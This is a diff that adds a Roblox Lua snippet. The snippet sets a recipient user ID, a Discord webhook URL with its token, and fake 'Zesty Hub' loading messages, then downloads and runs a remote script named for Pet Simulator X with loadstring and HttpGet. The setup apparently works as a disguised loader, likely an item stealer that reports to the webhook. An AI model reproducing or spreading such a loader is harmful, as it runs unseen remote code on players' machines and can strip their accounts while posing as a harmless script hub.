@@ -1,0 +1,19 @@
+```
+
+UserId = 2934556474
+
+WebHook = 'https://discord.com/api/webhooks/1067313554077798420/ORuuVajROZZcprgSyHFU_TCrmqVBUPUYioeorfuEK6BfUm56w1azGSZ06i8uxKnAYHHl'
+
+_G.CustomScriptName = "Zesty Hub"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Waiting for Zesty Hub"
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Scripts..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimxgm.lua"))()
+
+```
